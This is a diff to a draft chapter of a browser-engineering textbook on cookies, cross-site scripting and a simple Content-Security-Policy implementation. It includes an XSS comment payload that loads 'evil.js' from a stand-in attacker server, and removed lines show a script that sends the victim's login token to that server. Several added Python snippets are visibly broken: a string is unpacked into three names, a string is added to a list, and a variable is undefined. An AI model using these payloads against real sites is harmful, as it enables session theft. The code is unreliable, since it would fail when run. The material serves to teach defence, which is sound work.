@@ -144,6 +144,10 @@ signatures, and also the call to `show_comments` inside `add_entry`.
 With the guest book server storing information about each user
 accessing the guest book, we can now build a login system.
 
+::: {.further}
+Cookie patent
+:::
+
 A login system
 ==============
 
@@ -279,6 +283,9 @@ and implement cookies inside our own browser.
 [^7]: I should be hashing passwords! Using `bcrypt`! We should verify
     email addresses! Over TLS! We should run the server in a sandbox!
 
+::: {.further}
+GDPR / CCPA
+:::
 
 Implementing cookies
 ====================
@@ -346,24 +353,61 @@ JS files). Because we handle cookies inside `request`, this should
 automatically work correctly, with later requests transmitting cookies
 set by previous responses.
 
-------------------------------
 
-::: {.todo}
-Everything below here has not been edited and might not match perfectly.
-:::
 
 Cross-site scripting
 ====================
 
-Sure, the origin is uniquely owned by our web server, so there's no way
-some other web server could see the headers the server and browser send
-to each other.[^11][^12][^13][^14]
+Now that our browser supports cookies and uses them for logins, we
+need to make sure cookie data is safe from malicious actors. After
+all: if someone stole your `token` cookie, they could set their own
+browser's cookie to the same value, and then the server would think
+they are you and give them all the same permissions.
 
-But that's not the only way to read cookies! In fact, cookies are
-accessible from JavaScript as well, through the `document.cookie` field.
-This field is a string, containing the same contents as the `Cookie`
-header value. We can implement that pretty simply. First, in
-`runtime.js`:
+There are lots of ways people can steal your cookies. Our browser
+already prevents *other servers* from seeing your cookie values,
+because it stores cookies per-host.[^11][^12][^13][^14]
+
+[^11]: Well... Our connection isn't encrypted, so an attacker could
+    pick up the token from there. But another *server* couldn't.
+
+[^12]: Well... Another server could hijack our DNS and redirect our
+    hostname to a different IP address, and then steal our cookies. But
+    some ISPs support DNSSEC, which prevents that.
+
+[^13]: Well... A state-level attacker could announce fradulent BGP
+    routes, which would send even a correctly-retrieved IP address to
+    the wrong physical computer.
+
+[^14]: Security is very hard.
+
+But attackers might be able to get *your server* to help steal the
+cookie value. For example, cookies are accessible from JavaScript via
+the `document.cookie` field. This field is a string, containing the
+same contents as the `Cookie` header value. We can implement that in
+our browser pretty simply.
+
+First, we register `cookie` to a simple function that returns the cookie
+value:
+
+``` {.python}
+class JSContext:
+    def __init__(self, tab):
+        # ...
+        self.interp.export_function("cookie", self.cookie)
+        # ...
+
+    def cookie(self):
+        scheme, _, host = self.tab.url.split("/", 3)[2]
+        if ":" in host:
+            host, port = host.split(":", 1)
+            port = int(port)
+        else:
+            port = 80 if scheme == "http" else 443
+        return COOKIE_JAR.get((host, port), "")
+```
+
+Then we expose this in `runtime.js`:
 
 ``` {.javascript}
 Object.defineProperty(document, 'cookie', {
@@ -371,160 +415,168 @@ Object.defineProperty(document, 'cookie', {
 })
 ```
 
-Now we register `cookie` to a simple function that returns the cookie
-value:
+Once cookies are accessible from JavaScript, any scripts run on our
+server could, in principle, steal the cookie value. This might seem
+benign---doesn't our server only run `comment.js`? Well...
 
-``` {.python}
-class JSContext:
-    def __init__(self, tab):
-        # ...
-        self.interp.export_function("cookie", self.cookie_string)
-        # ...
-```
+Popular web services often become hunting grounds for malicious
+actors. So a web service needs to defend itself from being *misused*.
+Consider the code in our guest book that outputs guest book entries:
 
-Accessing cookies from JavaScript may seem benign, since the
-JavaScript being run, in `comment.js`, is our own and won't do
-anything malicious. And this is true, if our users cooperate. But web
-services sometimes turn into battlegrounds between users. And consider
-the code we wrote to output guest book entries:
-
-``` {.python expected=False}
-out += '<p>' + entry + ' <i> from ' + who + '</i></p>'
+``` {.python file=server indent=8}
+out += "<p>" + entry + " <i>by " + who + "</i></p>"
 ```
 
 Note that `entry` can be anything, anything the user might stick into
-our comment form. "Anything" might even include a user-written
-`<script>` tag! Let's imagine that you're logged in as one user, maybe
-`crashoverride`, but would like to gain access to another username,
-maybe `nameless`. You could post the comment:
+our comment form: even include a user-written `<script>` tag! Let's
+imagine that you're logged in as one user, maybe `crashoverride`, but
+would like to gain access to another username, maybe `nameless`. You
+could post the comment:
 
-``` {.example}
-Hi! <script src=http://my-server/evil.js></script>
-```
+    Hi! <script src="http://my-server/evil.js"></script>
 
-Our server would then output the HTML:[^15]
+Our server would then output the HTML:
 
-[^15]: A real browser would use form-encoding to transmit all of these
-    special characters. Our browser's form-encoding is very limited,
-    but this comment does go through.
+    <p>Hi! <script src="http://my-server/evil.js"></script>
+    <i> by crashoverride</i></p>
 
-``` {.example}
-<p>Hi! <script src=http://my-server/evil.js></script>
-<i> by crashoverride</i></p>
-```
+So, our browser would download and run the `evil.js` script. So
+`evil.js` could access `document.cookie` and do something evil; in
+real browser, this might mean using `fetch` to secretly send that
+cookie to a server the attacker controls.[^no-fetch]
 
-That would cause our browser to download the `evil.js` script.[^16] So
-`evil.js` could access `document.cookie` and do something evil.
-
-[^16]: Yes: real browsers, just like our toy browser, will download
-    and run JavaScript from any source, including from other servers
-    and origins, and they all run with the same permissions. This is
-    how JavaScript libraries usually work!
-
-Let's try it out. Post the above comment, except instead of
-`my-server` use `localhost:9000`, where we'll create a server with:
-
-``` {.example}
-python3 -m http.server 9000
-```
-
-That runs Python's built-in HTTP server on port 9000; it'll respond to
-`localhost:9000/<file>` with the contents of `<file>` in the current
-directory. Let's fill `evil.js` with the following contents:
-
-``` {.javascript}
-token = document.cookie.split("=")[1]
-body = document.querySelectorAll("body")[0]
-url = "http://localhost:9000/" + token
-body.innerHTML = "<a href=" + url + ">Click to continue</a>"
-```
-
-That replaces the whole web page with a single link. When the user
-clicks that link,[^17] their browser sends the evil web server the
-token value, embedded in the request URL. Our evil server records
-that, and the game is up! In a more feature-full browser, the link
-could be hidden. The attacker could make an `XMLHttpRequest`,[^18] add
-an image to the page that the browser will try to load (from our evil
-server), load JavaScript from our evil domain, or anything else like
-that. Even with the extremely limited DOM API our browser supports, we
-could better hide our evildoing:
-
-[^17]: You've seen "please click to continue" screens and have clicked
-    the button unthinkingly. Your users will too.
-
-[^18]: Scripts aren't allowed to read data from XHRs to another
-    origin, but the browser still makes the request.
-
-
-``` {.javascript}
-form = document.querySelectorAll("form")
-url = "http://localhost:9000/" + token
-newform = "<form action=" + url + " method=get>"
-newform += "<p><input name=guest></p>"
-newform += "<p><button>Sign the book!</button></p>"
-newform += "</form>"
-form.innerHTML= newform
-```
-
-This replaces the contents of the comment form with a new form (so it's
-a form in a form, with the inner form taking priority) that submits both
-the new comments and the login token to our evil server.
-
-Try these exploits out, both in our toy browser and in a real one.
+[^no-fetch]: Our browser doesn't implement `fetch`, but that doesn't
+    mean this attack won't work. For example, the evil script can
+    replace the whole page with a link that directs their site and
+    includes the token value in the URL. You've seen "please click to
+    continue" screens and have clicked the button unthinkingly; your
+    users will too.
 
 The core problem behind these problems is that user comments are
-supposed to be data, but the browser is interpreting them as code. This
-kind of exploit is usually called *cross-site scripting*, shortened to
-XSS, though the data-misinterpreted-as-code issue is a fairly broad one
-that occurs in many, many systems.
+supposed to be data, but the browser is interpreting them as code.
+This kind of exploit is usually called *cross-site scripting* (often
+written "XSS"), and the data-misinterpreted-as-code issue is a common
+security issue in all sorts of domains.
 
-Anyway, whatever it's called, we need to fix it, and the way we do that
-is not sending `entry`, the user comment, directly to the browser.
-Instead, we'd do something to ensure the browser would not interpret it
-as code, something like:
+The usual fix is to use a special encoding to avoid interpreting data
+as code. For example, in HTML, `&lt;` is supposed to be interpreted by
+the browser as a textual less-than sign.[^ch1-ex] Python's `html`
+module can do this kind of encoding:
 
-``` {.python expected=False}
-def html_escape(text):
-    return text.replace("&", "&amp;").replace("<", "&lt;")
+[^ch1-ex]: You may have implemented this as part of an [exercise in
+    Chapter 1](http.md#exercises).
+
+``` {.python file=server}
+import html
 
 def show_comments(username):
     # ...
-    out += "<p>" + html_escape(entry)
-    out += " <i>from " + html_escape(who) + "</i></p>"
+    out += "<p>" + html.escape(entry)
+    out += " <i>from " + html.escape(who) + "</i></p>"
     # ...
 ```
 
-Now the comment would would be printed as the code `&lt;script`,
-instead of as a literal script tag, so the browser will interpret it
-as text, not a tag,[^19] and won't run any code inside. Success! Most
-languages that you might write a web server in come with helper
-functions to do this escaping for you.[^python-html]
+This is a good fix, and you should do it. But if you forget to encode
+any text anywhere---that's a security bug. So browsers provide
+additional layers of defense.
 
-[^python-html]: In Python, use the `html` module's `escape` method. In
-    JavaScript, use `textContent` instead of `innerHTML` when you
-    don't intend to add HTML content.
+One such layer is the `Content-Security-Policy` header. The full
+specification for this header is quite complex, but in the simplest
+case, the header is set to the keyword `default-src` followed by a
+space-separated list of servers:
 
-I should add that there are other approaches to this bug. You could
-remove tags instead of escaping the angle bracket. You could prevent
-users from submitting comments with "invalid characters". You could do
-the character replacing before saving the entry, instead of before
-showing the entry. These are all worse than escaping:
+    Content-Security-Policy: default-src http://example.org http://www.example.org
 
--   Removing tags means implementing the quirky HTML parsing algorithm.
--   Preventing comments with tags has the same issue, and you need to
-    do the same check on the server and the client side. Plus, you
-    might write too tight a filter and prevent users from sending
-    something benign, like old-school heart emoticons `<3`.
--   Saving the character-replaced entry assumes you'll only consume
-    the entry in HTML. Your server might later want to use that data
-    in [JSON](https://www.json.org/) (you'll need to escape single quotes), or raw JavaScript
-    (you'll need to escape `</script>`), or JSON embedded in
-    JavaScript embedded in HTML. Data should be a single source of
-    truth, not a place to store mangled HTML.
+When the `Content-Security-Policy` header is provided, the browser
+should refuse to load any resources for that page (CSS, JavaScript,
+images, and so on) except from the listed servers. If our guest book
+used `Content-Security-Policy`, even if cross-site scripting attack
+succeeded, the browser would refuse to load and run the attacker's
+script.
 
-You might want to escape some more characters, like replacing double
-quotes with `&quot;` if you plan to stick user data into HTML
-attributes, but the method above is roughly correct in general concept.
+Let's implement support for this header. First, we'll need to extract
+and parse the `Content-Security-Policy` header:
+
+``` {.python}
+class Tab:
+    def load(self, url, body=None):
+        # ...
+        self.allowed_servers = None
+        if "content-security-policy" in headers:
+            csp = headers["content-security-policy"].split()
+            if len(csp) > 0 and csp[0] == "default-src":
+                self.allowed_servers = csp[1:] + "/"
+        # ...
+```
+
+Note that I'm adding a slash to the end of the server name in the
+header, so that I can test if a url is allowed using
+`startswith`.[^more-complex]
+
+[^more-complex]: In reality `Content-Security-Policy` can also list
+    scheme-generic URLs and even more complex sources like `'self'`.
+    This is a very limited CSP implementation.
+
+This parsing needs to happen _before_ we request any JavaScript or
+CSS, because before we request those things, we need to check whether
+the request is allowed:
+
+``` {.python}
+class Tab:
+    def load(self, url, body=None):
+        # ...
+        for script in scripts:
+            script_url = resolve_url(script, url)
+            if not self.allowed_request(script_url):
+                print("Blocked script", script, "due to CSP")
+                continue
+            # ...
+```
+
+We first resolve the script's relative URL to an absolute URL. Then we
+check to see if it starts with any of the allowed servers, and if not,
+we skip that script Do the same for CSS files.
+
+The `allowed_request` logic is a little tricky: it needs to handle both
+the case of no `Content-Security-Policy` and the case where there is
+one:
+
+``` {.python}
+class Tab:
+    def allowed_request(self, url):
+        if self.allowed_servers == None: return True
+        for server in allowed_servers:
+            if url.startswith(server):
+                return True
+        return False
+```
+
+To test that this works, we can first make our server send a
+`Content-Security-Policy`:
+
+``` {.python file=server}
+def handle_connection(conx):
+    # ...
+    response += "Content-Security-Policy: default-src http://localhost:8000\r\n"
+    # ...
+```
+
+For testing, let's next modify the web pages the server generates to
+request a script from somewhere else:
+
+``` {.python file=server}
+def show_comments(session):
+    # ...
+    out += "<script src=https://example.com/evil.js></script>"
+    # ...
+```
+
+If you've got everything implemented correctly, the browser should
+block the evil script[^evil-js] and report so in the console.
+
+[^evil-js]: Needless to say, `example.com` does not actually host an
+    `evil.js` file, and any request to it returns `404 Not Found`.
+
 
 Cross-site request forgery
 ==========================
@@ -705,14 +757,6 @@ subdomains from the cookie origin. Implement this in your browser,
 making sure to send these generalized-origin cookies on any requests
 covered by the generalized origin.
 
-*Content Security Policy*: The `Content-Security-Policy` header is a
-powerful tool in modern browsers to prevent XSS attacks. The full
-specification is quite complex, but in the simplest case, the header
-is set to the keyword `default-src` followed by a space-separated list
-of origins. That instructs the browser to refuse to load any resources
-for that page (CSS, JavaScript, images, and so on) except from those
-origins. Implement support for this header.
-
 *Referer*: When your browser visits a web page, or when it loads a CSS
 or JavaScript file, it sends a `Referer` header[^24] containing the
 URL it is coming from. Sites often use this for analytics. Implement
@@ -722,24 +766,6 @@ they don't want revealed to other websites, so browsers support a
 (never send the `Referer` header when leaving this page) or
 `same-origin` (only do so if navigating to another page on the same
 origin). Implement those two values for `Referer-Policy`.
-
-[^11]: Well... Our connection isn't encrypted, so an attacker could
-    pick up the token from there. But another *server* couldn't.
-
-[^12]: Well... Another server could hijack our DNS and redirect our
-    hostname to a different IP address, and then steal our cookies. But
-    some ISPs support DNSSEC, which prevents that.
-
-[^13]: Well... A state-level attacker could announce fradulent BGP
-    routes, which would send even a correctly-retrieved IP address to
-    the wrong physical computer.
-
-[^14]: Security is very hard.
-
-[^19]: In a real browser, that code will be displayed as a literal
-    less-than sign followed by the word `script`, but in our browser,
-    this won't happen, unless you did the relevant exercise in [Chapter
-    4](html.md).
 
 [^20]: Why is the user on the attacker's site? Perhaps it has funny
     memes, or it's been hacked and is being used for the attack
